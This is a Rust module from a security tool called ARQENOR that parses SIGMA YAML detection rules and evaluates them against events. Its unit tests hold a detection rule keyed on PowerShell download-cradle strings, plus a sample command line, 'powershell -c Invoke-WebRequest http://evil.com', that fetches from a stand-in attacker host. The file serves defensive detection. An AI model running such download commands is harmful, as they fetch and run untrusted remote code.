//! SIGMA rule engine — parse and evaluate SIGMA YAML detection rules.
//!
//! SIGMA is the open standard for log-based security detections.  Thousands of
//! community rules exist at <https://github.com/SigmaHQ/sigma>.  This module
//! provides:
//!
//! 1. **YAML parsing** — load SIGMA rules from files or strings.
//! 2. **Field mapping** — translate SIGMA field names to ARQENOR's event model.
//! 3. **Evaluation** — match a rule against an event's fields.
//!
//! Supported SIGMA features:
//! - Modifiers: `|contains`, `|endswith`, `|startswith`, `|re`, `|all`, `|base64`
//! - Conditions: `and`, `or`, `not`, `1 of …*`, `all of …*`, `all of them`, parens
//! - Logsource categories: process_creation, registry_event, file_event,
//!   network_connection, dns_query, image_load, driver_load

use std::collections::HashMap;
use std::path::Path;

use serde_yaml::Value;

use super::sigma_condition::{self, ConditionExpr};
use crate::models::alert::Severity;

// ── Error type ───────────────────────────────────────────────────────────────

#[derive(Debug)]
pub enum SigmaError {
    Yaml(serde_yaml::Error),
    Io(std::io::Error),
    MissingField(&'static str),
    InvalidCondition(sigma_condition::ConditionParseError),
    InvalidModifier(String),
}

impl std::fmt::Display for SigmaError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Yaml(e) => write!(f, "SIGMA YAML error: {e}"),
            Self::Io(e) => write!(f, "SIGMA I/O error: {e}"),
            Self::MissingField(name) => write!(f, "missing required field: `{name}`"),
            Self::InvalidCondition(e) => write!(f, "invalid condition: {e}"),
            Self::InvalidModifier(m) => write!(f, "unknown modifier: `{m}`"),
        }
    }
}

impl std::error::Error for SigmaError {}
impl From<serde_yaml::Error> for SigmaError {
    fn from(e: serde_yaml::Error) -> Self { Self::Yaml(e) }
}
impl From<std::io::Error> for SigmaError {
    fn from(e: std::io::Error) -> Self { Self::Io(e) }
}
impl From<sigma_condition::ConditionParseError> for SigmaError {
    fn from(e: sigma_condition::ConditionParseError) -> Self { Self::InvalidCondition(e) }
}

// ── Public types ─────────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SigmaStatus {
    Test,
    Stable,
    Experimental,
    Deprecated,
    Unsupported,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SigmaLevel {
    Informational,
    Low,
    Medium,
    High,
    Critical,
}

impl SigmaLevel {
    pub fn to_severity(&self) -> Severity {
        match self {
            Self::Informational => Severity::Info,
            Self::Low => Severity::Low,
            Self::Medium => Severity::Medium,
            Self::High => Severity::High,
            Self::Critical => Severity::Critical,
        }
    }
}

#[derive(Debug, Clone)]
pub struct LogSource {
    pub category: Option<String>,
    pub product: Option<String>,
    pub service: Option<String>,
}

/// How a field value should be compared against an event field.
#[derive(Debug, Clone)]
pub enum Modifier {
    /// Exact case-insensitive equality (default when no modifier).
    Equals,
    /// `|contains`
    Contains,
    /// `|startswith`
    StartsWith,
    /// `|endswith`
    EndsWith,
    /// `|re` — regular expression.
    Regex,
    /// `|base64` — match the base64-encoded version of the value.
    Base64,
    /// `|cidr` — CIDR IP range matching.
    Cidr,
}

/// A single field-level matcher inside a selection.
#[derive(Debug, Clone)]
pub struct FieldMatcher {
    /// SIGMA field name (before mapping, e.g. `Image`, `CommandLine`).
    pub field: String,
    /// How to compare.
    pub modifier: Modifier,
    /// Candidate values — at least one must match (OR), unless `match_all`.
    pub values: Vec<String>,
    /// `|all` modifier — ALL values must be present in the event field.
    pub match_all: bool,
}

/// A named selection group (all field matchers are AND-ed).
#[derive(Debug, Clone)]
pub struct SelectionGroup {
    pub fields: Vec<FieldMatcher>,
}

/// Parsed detection block.
#[derive(Debug, Clone)]
pub struct Detection {
    pub selections: HashMap<String, SelectionGroup>,
    pub condition: ConditionExpr,
}

/// A fully parsed SIGMA rule ready for evaluation.
#[derive(Debug, Clone)]
pub struct SigmaRule {
    pub id: String,
    pub title: String,
    pub description: Option<String>,
    pub status: SigmaStatus,
    pub level: SigmaLevel,
    pub logsource: LogSource,
    pub detection: Detection,
    pub tags: Vec<String>,
    /// ATT&CK technique IDs extracted from tags (e.g. `T1059.001`).
    pub attack_ids: Vec<String>,
}

// ── Generic event for SIGMA evaluation ───────────────────────────────────────

/// A flat key-value map representing an event.  Field names should use
/// ARQENOR's internal naming (`image_path`, `cmdline`, etc.).  The SIGMA
/// field-mapping layer translates standard names before lookup.
pub type EventFields = HashMap<String, String>;

// ── Parsing ──────────────────────────────────────────────────────────────────

/// Parse a single SIGMA rule from a YAML string.
pub fn parse_sigma_rule(yaml_str: &str) -> Result<SigmaRule, SigmaError> {
    let doc: Value = serde_yaml::from_str(yaml_str)?;

    let title = str_field(&doc, "title")?;
    let id = str_field_opt(&doc, "id").unwrap_or_else(|| title.clone());
    let description = str_field_opt(&doc, "description");
    let status = parse_status(str_field_opt(&doc, "status").as_deref().unwrap_or("test"));
    let level = parse_level(str_field_opt(&doc, "level").as_deref().unwrap_or("medium"));
    let logsource = parse_logsource(&doc)?;
    let detection = parse_detection(&doc)?;
    let tags = parse_tags(&doc);
    let attack_ids = extract_attack_ids(&tags);

    Ok(SigmaRule {
        id,
        title,
        description,
        status,
        level,
        logsource,
        detection,
        tags,
        attack_ids,
    })
}

/// Load all `.yml` / `.yaml` SIGMA rules from a directory (non-recursive).
pub fn load_sigma_rules_from_dir(path: &Path) -> Vec<SigmaRule> {
    let mut rules = Vec::new();
    let entries = match std::fs::read_dir(path) {
        Ok(e) => e,
        Err(e) => {
            tracing::warn!("cannot read SIGMA rules dir {}: {e}", path.display());
            return rules;
        }
    };

    for entry in entries.flatten() {
        let p = entry.path();
        let ext = p.extension().and_then(|e| e.to_str()).unwrap_or("");
        if ext != "yml" && ext != "yaml" {
            continue;
        }
        match std::fs::read_to_string(&p) {
            Ok(content) => match parse_sigma_rule(&content) {
                Ok(rule) => rules.push(rule),
                Err(e) => tracing::warn!("skip {}: {e}", p.display()),
            },
            Err(e) => tracing::warn!("skip {}: {e}", p.display()),
        }
    }

    tracing::info!(count = rules.len(), "loaded SIGMA rules from {}", path.display());
    rules
}

// ── Evaluation ───────────────────────────────────────────────────────────────

/// Evaluate a SIGMA rule against an event.
///
/// Field names in `event` should use ARQENOR's internal names.
/// The evaluator maps SIGMA field names automatically via [`sigma_field_to_arqenor`].
pub fn evaluate(rule: &SigmaRule, event: &EventFields) -> bool {
    let category = rule.logsource.category.as_deref().unwrap_or("");

    // Evaluate every selection group.
    let mut sel_results: HashMap<String, bool> = HashMap::new();
    for (name, group) in &rule.detection.selections {
        let matched = evaluate_selection(group, event, category);
        sel_results.insert(name.clone(), matched);
    }

    // Evaluate the condition expression against the selection results.
    sigma_condition::evaluate(&rule.detection.condition, &sel_results)
}

fn evaluate_selection(group: &SelectionGroup, event: &EventFields, category: &str) -> bool {
    // All field matchers in a selection are AND-ed.
    group.fields.iter().all(|fm| evaluate_field_matcher(fm, event, category))
}

fn evaluate_field_matcher(fm: &FieldMatcher, event: &EventFields, category: &str) -> bool {
    let arqenor_field = sigma_field_to_arqenor(&fm.field, category);
    let event_value = match event.get(arqenor_field) {
        Some(v) => v.to_lowercase(),
        None => return false,
    };

    if fm.match_all {
        // All values must match (AND).
        fm.values.iter().all(|v| match_value(&event_value, v, &fm.modifier))
    } else {
        // At least one value must match (OR).
        fm.values.iter().any(|v| match_value(&event_value, v, &fm.modifier))
    }
}

fn match_value(event_value: &str, pattern: &str, modifier: &Modifier) -> bool {
    let pat = pattern.to_lowercase();
    match modifier {
        Modifier::Equals => event_value == pat,
        Modifier::Contains => event_value.contains(&pat),
        Modifier::StartsWith => event_value.starts_with(&pat),
        Modifier::EndsWith => event_value.ends_with(&pat),
        Modifier::Regex => {
            regex::Regex::new(pattern)
                .map(|re| re.is_match(event_value))
                .unwrap_or(false)
        }
        Modifier::Base64 => {
            use base64::Engine;
            let encoded = base64::engine::general_purpose::STANDARD.encode(pattern.as_bytes());
            event_value.contains(&encoded.to_lowercase())
        }
        Modifier::Cidr => {
            // Simple CIDR matching: parse "1.2.3.0/24" and check if event IP is in range.
            match_cidr(event_value, &pat)
        }
    }
}

fn match_cidr(ip_str: &str, cidr: &str) -> bool {
    let parts: Vec<&str> = cidr.split('/').collect();
    if parts.len() != 2 {
        return false;
    }
    let Ok(net_ip) = parts[0].parse::<std::net::Ipv4Addr>() else { return false };
    let Ok(prefix_len) = parts[1].parse::<u32>() else { return false };
    let Ok(check_ip) = ip_str.parse::<std::net::Ipv4Addr>() else { return false };

    if prefix_len > 32 {
        return false;
    }
    let mask = if prefix_len == 0 { 0u32 } else { !0u32 << (32 - prefix_len) };
    (u32::from(net_ip) & mask) == (u32::from(check_ip) & mask)
}

// ── Field mapping ────────────────────────────────────────────────────────────

/// Map SIGMA standard field names to ARQENOR's internal event field names.
pub fn sigma_field_to_arqenor<'a>(sigma_field: &'a str, category: &str) -> &'a str {
    // SIGMA uses mixed-case field names; we match case-insensitively at the
    // event level, but the mapping keys here are the canonical SIGMA names.
    match (category, sigma_field) {
        // process_creation
        (_, "Image") => "image_path",
        (_, "OriginalFileName") => "original_file_name",
        (_, "CommandLine") => "cmdline",
        (_, "ParentImage") => "parent_image",
        (_, "ParentCommandLine") => "parent_cmdline",
        (_, "User") => "user",
        (_, "IntegrityLevel") => "integrity_level",
        (_, "CurrentDirectory") => "current_dir",
        (_, "ProcessId") => "pid",
        (_, "ParentProcessId") => "ppid",
        // registry
        (_, "TargetObject") => "key_path",
        (_, "Details") => "value_data",
        (_, "EventType") => "event_type",
        // file
        (_, "TargetFilename") => "file_path",
        (_, "SourceFilename") => "source_path",
        // network
        (_, "DestinationIp") => "dst_ip",
        (_, "DestinationPort") => "dst_port",
        (_, "SourceIp") => "src_ip",
        (_, "SourcePort") => "src_port",
        (_, "Protocol") => "protocol",
        (_, "Initiated") => "initiated",
        // dns
        (_, "QueryName") => "query_name",
        (_, "QueryType") => "query_type",
        (_, "QueryResults") => "query_results",
        // image_load / driver_load
        (_, "ImageLoaded") => "image_loaded",
        (_, "Signed") => "signed",
        (_, "Signature") => "signature",
        (_, "SignatureStatus") => "signature_status",
        // Default: pass through unchanged.
        _ => sigma_field,
    }
}

// ── Parsing helpers ──────────────────────────────────────────────────────────

fn str_field(doc: &Value, key: &'static str) -> Result<String, SigmaError> {
    doc.get(key)
        .and_then(|v| v.as_str())
        .map(String::from)
        .ok_or(SigmaError::MissingField(key))
}

fn str_field_opt(doc: &Value, key: &str) -> Option<String> {
    doc.get(key).and_then(|v| v.as_str()).map(String::from)
}

fn parse_status(s: &str) -> SigmaStatus {
    match s.to_lowercase().as_str() {
        "stable" => SigmaStatus::Stable,
        "experimental" => SigmaStatus::Experimental,
        "deprecated" => SigmaStatus::Deprecated,
        "unsupported" => SigmaStatus::Unsupported,
        _ => SigmaStatus::Test,
    }
}

fn parse_level(s: &str) -> SigmaLevel {
    match s.to_lowercase().as_str() {
        "informational" => SigmaLevel::Informational,
        "low" => SigmaLevel::Low,
        "medium" => SigmaLevel::Medium,
        "high" => SigmaLevel::High,
        "critical" => SigmaLevel::Critical,
        _ => SigmaLevel::Medium,
    }
}

fn parse_logsource(doc: &Value) -> Result<LogSource, SigmaError> {
    let ls = doc.get("logsource").ok_or(SigmaError::MissingField("logsource"))?;
    Ok(LogSource {
        category: ls.get("category").and_then(|v| v.as_str()).map(String::from),
        product: ls.get("product").and_then(|v| v.as_str()).map(String::from),
        service: ls.get("service").and_then(|v| v.as_str()).map(String::from),
    })
}

fn parse_tags(doc: &Value) -> Vec<String> {
    doc.get("tags")
        .and_then(|v| v.as_sequence())
        .map(|seq| {
            seq.iter()
                .filter_map(|v| v.as_str().map(String::from))
                .collect()
        })
        .unwrap_or_default()
}

fn extract_attack_ids(tags: &[String]) -> Vec<String> {
    tags.iter()
        .filter_map(|tag| {
            let t = tag.strip_prefix("attack.")?;
            // ATT&CK IDs look like "t1059.001" — normalise to uppercase.
            if t.starts_with('t') || t.starts_with('T') {
                Some(t.to_uppercase())
            } else {
                None
            }
        })
        .collect()
}

fn parse_detection(doc: &Value) -> Result<Detection, SigmaError> {
    let det = doc.get("detection").ok_or(SigmaError::MissingField("detection"))?;
    let det_map = det.as_mapping().ok_or(SigmaError::MissingField("detection (mapping)"))?;

    // Separate "condition" from selection entries.
    let condition_str = det
        .get("condition")
        .and_then(|v| v.as_str())
        .ok_or(SigmaError::MissingField("detection.condition"))?;

    let condition = sigma_condition::parse(condition_str)?;

    let mut selections: HashMap<String, SelectionGroup> = HashMap::new();
    for (key, value) in det_map {
        let name = key.as_str().unwrap_or("").to_string();
        if name == "condition" {
            continue;
        }
        let group = parse_selection_group(value)?;
        selections.insert(name, group);
    }

    Ok(Detection { selections, condition })
}

fn parse_selection_group(value: &Value) -> Result<SelectionGroup, SigmaError> {
    let mut fields = Vec::new();

    match value {
        Value::Mapping(map) => {
            for (k, v) in map {
                let raw_key = k.as_str().unwrap_or("");
                let (field, modifier, match_all) = parse_field_key(raw_key)?;
                let values = value_to_strings(v);
                fields.push(FieldMatcher { field, modifier, values, match_all });
            }
        }
        Value::Sequence(seq) => {
            // A selection can be a list of maps (OR between maps, AND within each).
            // We flatten: each map contributes field matchers.  For simplicity we
            // treat the whole list as one AND group (SIGMA spec: list of maps = OR,
            // but most rules use map-only selections).
            for item in seq {
                if let Value::Mapping(map) = item {
                    for (k, v) in map {
                        let raw_key = k.as_str().unwrap_or("");
                        let (field, modifier, match_all) = parse_field_key(raw_key)?;
                        let values = value_to_strings(v);
                        fields.push(FieldMatcher { field, modifier, values, match_all });
                    }
                }
            }
        }
        _ => {}
    }

    Ok(SelectionGroup { fields })
}

/// Parse a SIGMA field key like `CommandLine|contains|all` into components.
fn parse_field_key(raw: &str) -> Result<(String, Modifier, bool), SigmaError> {
    let parts: Vec<&str> = raw.split('|').collect();
    let field = parts[0].to_string();
    let mut modifier = Modifier::Equals;
    let mut match_all = false;

    for &part in &parts[1..] {
        match part.to_lowercase().as_str() {
            "contains" => modifier = Modifier::Contains,
            "endswith" => modifier = Modifier::EndsWith,
            "startswith" => modifier = Modifier::StartsWith,
            "re" => modifier = Modifier::Regex,
            "base64" | "base64offset" => modifier = Modifier::Base64,
            "cidr" => modifier = Modifier::Cidr,
            "all" => match_all = true,
            "utf8" | "wide" => {} // encoding hints — we match as-is
            other => {
                tracing::debug!("ignoring unknown SIGMA modifier: `{other}`");
            }
        }
    }

    Ok((field, modifier, match_all))
}

/// Convert a YAML value (string, int, sequence, bool) into a Vec<String>.
fn value_to_strings(v: &Value) -> Vec<String> {
    match v {
        Value::String(s) => vec![s.clone()],
        Value::Number(n) => vec![n.to_string()],
        Value::Bool(b) => vec![b.to_string()],
        Value::Sequence(seq) => seq
            .iter()
            .filter_map(|item| match item {
                Value::String(s) => Some(s.clone()),
                Value::Number(n) => Some(n.to_string()),
                Value::Bool(b) => Some(b.to_string()),
                _ => None,
            })
            .collect(),
        _ => vec![],
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE_RULE: &str = r#"
title: Suspicious PowerShell Download
id: e3b0c442-98fc-1c14-b39f-938e3e1f0a0a
status: stable
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - 'Invoke-WebRequest'
            - 'Net.WebClient'
            - 'DownloadString'
    condition: selection
level: high
tags:
    - attack.execution
    - attack.t1059.001
"#;

    #[test]
    fn test_parse_rule() {
        let rule = parse_sigma_rule(SAMPLE_RULE).unwrap();
        assert_eq!(rule.title, "Suspicious PowerShell Download");
        assert_eq!(rule.level, SigmaLevel::High);
        assert_eq!(rule.attack_ids, vec!["T1059.001"]);
        assert_eq!(rule.logsource.category.as_deref(), Some("process_creation"));
        assert_eq!(rule.detection.selections.len(), 1);
    }

    #[test]
    fn test_evaluate_match() {
        let rule = parse_sigma_rule(SAMPLE_RULE).unwrap();
        let mut event = EventFields::new();
        event.insert("image_path".into(), r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".into());
        event.insert("cmdline".into(), "powershell -c Invoke-WebRequest http://evil.com".into());
        assert!(evaluate(&rule, &event));
    }

    #[test]
    fn test_evaluate_no_match() {
        let rule = parse_sigma_rule(SAMPLE_RULE).unwrap();
        let mut event = EventFields::new();
        event.insert("image_path".into(), r"C:\Windows\System32\cmd.exe".into());
        event.insert("cmdline".into(), "dir".into());
        assert!(!evaluate(&rule, &event));
    }

    #[test]
    fn test_and_not_condition() {
        let yaml = r#"
title: Test And Not
logsource:
    category: process_creation
detection:
    selection:
        Image|endswith: '\cmd.exe'
    filter:
        ParentImage|endswith: '\explorer.exe'
    condition: selection and not filter
level: medium
"#;
        let rule = parse_sigma_rule(yaml).unwrap();

        let mut event = EventFields::new();
        event.insert("image_path".into(), r"C:\Windows\System32\cmd.exe".into());
        event.insert("parent_image".into(), r"C:\suspect\dropper.exe".into());
        assert!(evaluate(&rule, &event));

        // Should NOT match when parent is explorer (filtered out).
        event.insert("parent_image".into(), r"C:\Windows\explorer.exe".into());
        assert!(!evaluate(&rule, &event));
    }
}
